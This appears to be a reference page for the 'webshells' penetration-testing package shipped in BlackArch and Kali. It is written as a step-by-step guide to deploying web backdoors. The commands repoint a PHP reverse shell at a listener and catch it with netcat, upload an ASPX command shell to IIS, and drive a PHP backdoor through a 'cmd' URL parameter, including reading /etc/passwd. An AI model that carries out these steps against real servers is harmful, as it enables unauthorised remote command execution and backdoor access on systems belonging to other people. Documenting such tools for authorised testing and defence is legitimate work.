---
name: "webshells"
categories:
  - blackarch-webapp
version: "46.e8e1a37"
homepage: "https://github.com/BlackArch/webshells"
packaged-by: [blackarch, kali]
blackarch-builddate: "2023-01-28"
build-system: scripts
license: custom:unknown
meta-checked: "2026-11-09"
github-repo: "BlackArch/webshells"
github-stars: 1035
github-pushed: "2023-10-04"
github-archived: false
github-issues: 4
github-match: "exact"
gh-checked: "2026-11-07"
worth: 3.7
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# webshells

> A packaged collection of ready-to-deploy web backdoors and reverse shells in PHP, ASP, ASPX, JSP, CFM, Perl and Ruby.

## What it's for

This is not a program but a curated collection of web shell scripts, installed by the `webshells` package under `/usr/share/webshells/` and organized one directory per server language (`php/`, `asp/`, `aspx/`, `cfm/`, `jsp/`, `perl/`, `ruby/`). The typical workflow is: pick a shell that matches the target's stack, copy it out of the collection, adapt its connection parameters, upload it through whatever file-upload or write primitive you have, and interact with it over HTTP. The collection spans classic families — command-execution backdoors, PHP reverse shells, file managers such as b374k, c99 and r57. Treat the contents as unvetted: the maintainers explicitly warn that the shells are not audited and may contain backdoors, so always read a shell's source before deploying it. It ships no scanner, listener or generator — pairing tools (netcat, a HTTP server) are up to you.

## Typical use cases

### See what shells are packaged for a given stack

Inventory the collection before choosing a payload.

```
ls /usr/share/webshells/php/
```

Outcome: lists the PHP shells available on this host (the same works for `asp/`, `aspx/`, `cfm/`, `jsp/`, `perl/`, `ruby/`), from one-liner command backdoors to full file-manager shells — pick by target language and by how much functionality you need.

### Deploy the packaged PHP reverse shell

Get a TCP shell on a LAMP-style target using the collection's reverse shell.

```
cp /usr/share/webshells/php/php-reverse-shell.php .
sed -i 's/127\.0\.0\.1/198.51.100.10/' php-reverse-shell.php
sed -i 's/^\$port = 1234/\$port = 4444/' php-reverse-shell.php
```

Outcome: a copy of the reverse shell in the working directory with its `$ip` and `$port` variables (the two lines marked `// CHANGE THIS` in the script) repointed at your listener; upload the file through the target's upload mechanism, trigger it over HTTP, and catch the shell with `nc -lvnp 4444`.

### Deploy an ASPX command shell on IIS

Run commands on a Windows/IIS host through a minimal ASPX page.

```
cp /usr/share/webshells/aspx/cmdasp.aspx .
```

Outcome: puts a single-page command shell in the working directory; upload it to a writable location inside an IIS application, browse to it, and it presents an input form that executes each submitted command via `cmd.exe` and shows the output in the page — no listener needed, it is a direct-execution web shell.

### Use a minimal PHP command backdoor

Execute single commands through a URL parameter.

```
cp /usr/share/webshells/php/simple-backdoor.php .
curl "http://target.example.com/uploads/simple-backdoor.php?cmd=whoami"
```

Outcome: after upload, every request with a `cmd` parameter runs that command through PHP's `system()` and returns the output wrapped in `<pre>` tags (the shell's own documented usage is `?cmd=cat+/etc/passwd`) — smallest possible footprint, at the cost of no persistence or interaction.

### Vet a shell before deploying it

Read the source of any shell from the collection first.

```
less /usr/share/webshells/php/b374k.php
```

Outcome: opens the full source of the b374k file-manager shell for review before anything is deployed — the collection is explicitly unaudited, shells can phone home or contain embedded backdoors, and any password or configuration variable inside must be set deliberately rather than left at its default.
